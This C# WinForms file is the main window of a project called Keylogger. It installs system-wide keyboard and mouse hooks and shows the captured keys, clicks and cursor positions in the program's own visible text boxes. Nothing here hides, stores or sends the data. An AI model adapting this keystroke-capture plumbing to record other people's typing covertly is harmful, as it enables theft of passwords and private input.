using Keylogger.Hooks;
using Keylogger.Services;
using Keylogger.WMI;
using static Keylogger.Interop.Win32ApiHelper;

namespace Keylogger.Views
{
    public partial class MainWindow : Form
    {
        private readonly HookService _hookService = new();

        public MainWindow()
        {
            InitializeComponent();

            LblOS.Text = $"{Environment.MachineName} | {Win32OperatingSystem.GetOSVersion()}";
            CmbBoxEvents.Items.AddRange([.. KeyboardEvents.Keys]);
            CmbBoxEvents.SelectedIndex = 0;
            UpdateSelectedEventPredicate();

            KeyboardHook.CallBackMethod = LogKeyboardHook;
            MouseHook.LogMouseButtonsCallback = LogMouseButtons;
            MouseHook.LogMousePositionCallback = LogMousePosition;
        }

        private void LogKeyboardHook(string message, string key)
        {
            RichTxtKeyboard.AppendText($"{key}");
        }

        private void LogMouseButtons(string message, string position)
        {
            var time = DateTime.Now.ToString("hh:mm:ss tt");
            var format = "{0,-15}{1,-21}{2,18}";
            var finalMessage = string.Format(format, time, message, position);

            RichTxtMouseButtons.AppendText(finalMessage + Environment.NewLine);
        }

        private void LogMousePosition(string message, string position)
        {
            string time = DateTime.Now.ToString("hh:mm:ss tt");
            var format = "{0,-15}{1,-13}{2,18}";
            var finalMessage = string.Format(format, time, message, position);

            RichTxtMousePosition.AppendText(finalMessage + Environment.NewLine);
        }

        private void UpdateSelectedEventPredicate()
        {
            var selectedKey = CmbBoxEvents.SelectedItem?.ToString();
            if (selectedKey is not null && KeyboardEvents.TryGetValue(selectedKey, out var predicate))
            {
                KeyboardHook.SelectedEventPredicate = predicate;
            }
        }

        private void MainWindow_Load(object sender, EventArgs e) => _hookService.InstallHooks();

        private void MainWindow_FormClosing(object sender, FormClosingEventArgs e) => _hookService.UninstallHooks();

        private void CmbBoxEvents_SelectedIndexChanged(object sender, EventArgs e) => UpdateSelectedEventPredicate();
    }
}